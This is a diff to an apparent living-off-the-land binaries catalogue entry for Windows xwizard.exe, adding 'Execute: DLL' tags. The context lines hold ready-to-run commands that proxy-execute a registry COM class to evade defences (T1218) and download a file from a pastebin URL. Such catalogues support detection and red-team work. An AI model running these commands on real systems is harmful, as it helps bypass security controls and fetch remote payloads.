@@ -11,6 +11,8 @@ Commands:
     Privileges: User
     MitreID: T1218
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
+    Tags:
+      - Execute: DLL
   - Command: xwizard RunWizard /taero /u {00000001-0000-0000-0000-0000FEEDACDC}
     Description: Xwizard.exe running a custom class that has been added to the registry. The /t and /u switch prevent an error message in later Windows 10 builds.
     Usecase: Run a com object created in registry to evade defensive counter measures
@@ -18,6 +20,8 @@ Commands:
     Privileges: User
     MitreID: T1218
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
+    Tags:
+      - Execute: DLL
   - Command: xwizard RunWizard {7940acf8-60ba-4213-a7c3-f3b400ee266d} /zhttps://pastebin.com/raw/iLxUT5gM
     Description: Xwizard.exe uses RemoteApp and Desktop Connections wizard to download a file, and save it to INetCache.
     Usecase: Download file from Internet
